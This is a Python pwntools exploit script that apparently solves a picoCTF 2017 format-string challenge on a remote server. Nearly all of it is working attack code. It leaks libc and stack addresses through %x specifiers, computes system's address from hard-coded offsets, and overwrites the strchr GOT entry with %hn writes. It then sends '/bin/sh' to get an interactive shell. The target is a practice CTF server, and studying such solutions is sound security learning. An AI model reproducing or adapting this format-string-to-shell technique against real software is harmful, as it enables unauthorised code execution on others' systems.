#!/usr/bin/env python3

import pwn

rem = pwn.remote('shell2017.picoctf.com', 43876)

def get_addr(n):
	rem.sendline('%{0}$x'.format(n))
	for _ in range(2): rem.recvline()
	get = rem.recvline()
	for _ in range(12): rem.recvline()
	return int(get.split()[0][2:].decode(), 16)

def write(n, pad):
	rem.sendline('%{1}c%{0}$hn'.format(n, pad))
	for _ in range(15): rem.recvline()

def write2(n1, pad1, n2, pad2):
	rem.sendline('%{1}c%{0}$hn%{3}c%{2}$hn'.format(n1, pad1, n2, pad2))
	for _ in range(15): rem.recvline()

# get offset by ssh into remote server and readelf -s $(dynamic library)
stdin_offset = 0x1a9c20
system_offset = 0x3e3e0

# get address of system
stdin_addr = get_addr(2)
system_addr = stdin_addr - stdin_offset + system_offset

shift = 0x81

# get stack top address
stack_top = get_addr(9) - 0x40
stack_top_lower = stack_top & 0x0000ffff

# our target is strchr
# overwrite strchr with system

strchr_got_lower = 0x9980

write(17, stack_top_lower + 0xa4 - shift)
write(53, strchr_got_lower - shift)
write(17, stack_top_lower + 0xac - shift)
write(53, strchr_got_lower + 0x2 - shift)

system_addr_low = (system_addr & 0x0000ffff)
system_addr_high = (system_addr & 0xffff0000) >> 16

write2(41, system_addr_low - shift, 43, system_addr_high - system_addr_low)

# get the shell by typing /bin/sh
rem.sendline('/bin/sh')
rem.interactive()
